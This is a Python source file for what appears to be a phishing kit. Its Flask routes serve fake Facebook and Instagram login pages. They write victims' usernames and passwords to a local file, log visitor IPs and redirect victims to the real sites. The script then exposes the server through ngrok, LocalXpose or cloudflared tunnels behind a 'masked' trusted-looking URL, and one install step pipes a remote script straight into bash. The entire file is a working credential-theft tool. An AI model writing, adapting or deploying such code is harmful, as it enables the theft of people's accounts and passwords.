import os
import subprocess
import time
import sys
import platform
import shutil
from datetime import datetime
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# ASCII Banner
def show_banner():
    print("""
     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
     ██║██████╔╝███████║██║███████╗███████║
██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
 ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    """)

# Log credentials and sessions (same as before)
def log_credentials(username, password, service):
    with open('credentials.txt', 'a') as f:
        f.write(f"[{datetime.now()}] Service: {service}, Username: {username}, Password: {password}\n")

def log_session(ip, service):
    with open('sessions.log', 'a') as f:
        f.write(f"[{datetime.now()}] IP: {ip}, Visited: {service}\n")

# Phishing routes (same as before)
@app.route('/')
def home():
    return render_template('login.html')

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')
        log_credentials(username, password, 'Facebook')
        return redirect("https://facebook.com")
    log_session(request.remote_addr, 'Facebook')
    return render_template('facebook.html')

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        log_credentials(username, password, 'Instagram')
        return redirect("https://instagram.com")
    log_session(request.remote_addr, 'Instagram')
    return render_template('instagram.html')

# Detect OS and Termux
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

def get_install_command(pkg):
    system = platform.system().lower()
    if system == "linux":
        if shutil.which("apt"):  # Debian/Ubuntu/Kali
            return f"sudo apt install -y {pkg}"
        elif shutil.which("pacman"):  # Arch/Manjaro
            return f"sudo pacman -S --noconfirm {pkg}"
        elif shutil.which("dnf"):  # Fedora
            return f"sudo dnf install -y {pkg}"
        elif shutil.which("zypper"):  # OpenSUSE
            return f"sudo zypper install -y {pkg}"
        elif is_termux():  # Termux
            return f"pkg install -y {pkg}"
    elif system == "darwin":  # macOS
        return f"brew install {pkg}"
    return None

# Find tool in PATH or common paths
def find_tool(tool_name):
    paths = [
        f"/usr/local/bin/{tool_name}",
        f"/usr/bin/{tool_name}",
        f"/bin/{tool_name}",
        f"{os.getenv('HOME')}/.local/bin/{tool_name}",
        f"{os.getenv('HOME')}/bin/{tool_name}",
        f"{tool_name}"  # Check PATH
    ]
    if is_termux():
        paths.insert(0, f"/data/data/com.termux/files/usr/bin/{tool_name}")
    for path in paths:
        if os.path.exists(path):
            return path
    return None

# Install Cloudflared
def install_cloudflared():
    try:
        system = platform.system().lower()
        if is_termux():
            print("\n[+] Installing Cloudflared for Termux...")
            subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
            return True
        elif system == "linux":
            print("\n[+] Installing Cloudflared for Linux...")
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            subprocess.run(["wget", url, "-O", "cloudflared"], check=True)
            subprocess.run(["chmod", "+x", "cloudflared"], check=True)
            subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"], check=True)
            return True
        elif system == "darwin":  # macOS
            print("\n[+] Installing Cloudflared for macOS...")
            subprocess.run(["brew", "install", "cloudflared"], check=True)
            return True
        elif system == "windows":
            print("\n[!] Please download Cloudflared for Windows from:")
            print("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe")
            return False
    except Exception as e:
        print(f"\n[!] Failed to install Cloudflared: {e}")
        return False

# Install LocalXpose
def install_localxpose():
    try:
        if is_termux():
            print("\n[!] LocalXpose is not officially supported on Termux.")
            return False
        system = platform.system().lower()
        if system in ["linux", "darwin"]:
            print("\n[+] Installing LocalXpose...")
            subprocess.run(["curl", "-s", "https://localxpose.io/download.sh", "|", "bash"], shell=True, check=True)
            subprocess.run(["sudo", "mv", "lx", "/usr/local/bin/localxpose"], check=True)
            return True
        elif system == "windows":
            print("\n[!] Please download LocalXpose for Windows from:")
            print("https://localxpose.io/download")
            return False
    except Exception as e:
        print(f"\n[!] Failed to install LocalXpose: {e}")
        return False

# Install Ngrok
def install_ngrok():
    try:
        system = platform.system().lower()
        if is_termux():
            print("\n[+] Installing Ngrok for Termux...")
            subprocess.run(["pkg", "install", "-y", "ngrok"], check=True)
            return True
        elif system == "linux":
            if shutil.which("apt"):  # Debian/Ubuntu/Kali
                print("\n[+] Installing Ngrok for Debian-based Linux...")
                subprocess.run(["curl", "-s", "https://ngrok-agent.s3.amazonaws.com/ngrok.asc", "|", "sudo", "tee", "/etc/apt/trusted.gpg.d/ngrok.asc", ">/dev/null"], shell=True, check=True)
                subprocess.run(["echo", "\"deb https://ngrok-agent.s3.amazonaws.com buster main\"", "|", "sudo", "tee", "/etc/apt/sources.list.d/ngrok.list"], shell=True, check=True)
                subprocess.run(["sudo", "apt", "update"], check=True)
                subprocess.run(["sudo", "apt", "install", "-y", "ngrok"], check=True)
                return True
            elif shutil.which("pacman"):  # Arch/Manjaro
                print("\n[+] Installing Ngrok for Arch Linux...")
                subprocess.run(["yay", "-S", "--noconfirm", "ngrok"], check=True)
                return True
        elif system == "darwin":  # macOS
            print("\n[+] Installing Ngrok for macOS...")
            subprocess.run(["brew", "install", "ngrok"], check=True)
            return True
        elif system == "windows":
            print("\n[!] Please download Ngrok for Windows from:")
            print("https://ngrok.com/download")
            return False
    except Exception as e:
        print(f"\n[!] Failed to install Ngrok: {e}")
        return False

# Start Cloudflared (updated for Termux)
def start_cloudflared(port=8080):
    tool_path = find_tool("cloudflared")
    if not tool_path:
        print("\n[!] Cloudflared not found.")
        choice = input("Do you want to install Cloudflared? (y/n): ").strip().lower()
        if choice == "y":
            if not install_cloudflared():
                return False
            tool_path = find_tool("cloudflared")
        else:
            return False
    try:
        if is_termux():
            subprocess.Popen([tool_path, "tunnel", "--url", f"http://localhost:{port}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            subprocess.Popen([tool_path, "tunnel", "--url", f"http://localhost:{port}"])
        time.sleep(5)
        print("\n[+] Cloudflared tunnel started successfully!")
        return True
    except Exception as e:
        print(f"\n[!] Failed to start Cloudflared: {e}")
        return False

# Start LocalXpose (updated for Termux)
def start_localxpose(auth_token, domain, port=8080):
    if is_termux():
        print("\n[!] LocalXpose is not supported on Termux.")
        return False
    tool_path = find_tool("localxpose")
    if not tool_path:
        print("\n[!] LocalXpose not found.")
        choice = input("Do you want to install LocalXpose? (y/n): ").strip().lower()
        if choice == "y":
            if not install_localxpose():
                return False
            tool_path = find_tool("localxpose")
        else:
            return False
    try:
        subprocess.Popen([tool_path, "http", str(port), "--to", domain, "--auth", auth_token])
        print("\n[+] LocalXpose tunnel started successfully!")
        return True
    except Exception as e:
        print(f"\n[!] Failed to start LocalXpose: {e}")
        return False

# Start Ngrok (updated for Termux)
def start_ngrok(auth_token, port=8080):
    tool_path = find_tool("ngrok")
    if not tool_path:
        print("\n[!] Ngrok not found.")
        choice = input("Do you want to install Ngrok? (y/n): ").strip().lower()
        if choice == "y":
            if not install_ngrok():
                return False
            tool_path = find_tool("ngrok")
        else:
            return False
    try:
        if is_termux():
            subprocess.Popen([tool_path, "http", str(port), "--authtoken", auth_token, "--log=stdout"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            subprocess.Popen([tool_path, "http", str(port), "--authtoken", auth_token, "--log=stdout"])
        time.sleep(5)
        print("\n[+] Ngrok tunnel started successfully!")
        return True
    except Exception as e:
        print(f"\n[!] Failed to start Ngrok: {e}")
        return False

# Main setup (same as before)
def setup():
    show_banner()
    print("\n[+] Select Phishing Page:")
    print("1. Facebook")
    print("2. Instagram")
    choice = input("\nEnter choice (1/2): ").strip()

    print("\n[+] Select Tunnel Service:")
    print("1. Ngrok")
    print("2. LocalXpose")
    print("3. Cloudflared")
    tunnel_choice = input("\nEnter choice (1/2/3): ").strip()

    masked_url = input("\nEnter URL to mask (e.g., https://trusted-site.com): ").strip()

    if tunnel_choice == "1":
        ngrok_token = input("\nNgrok Auth Token: ").strip()
        if not start_ngrok(ngrok_token):
            sys.exit(1)
    elif tunnel_choice == "2":
        localxpose_token = input("\nLocalXpose Auth Token: ").strip()
        if not start_localxpose(localxpose_token, masked_url):
            sys.exit(1)
    elif tunnel_choice == "3":
        if not start_cloudflared():
            sys.exit(1)
    else:
        print("\n[!] Invalid choice. Exiting.")
        sys.exit(1)

    print(f"\n[+] Phishing page active! Masked URL: {masked_url}")

if __name__ == '__main__':
    setup()
    app.run(host='127.0.0.1', port=8080)
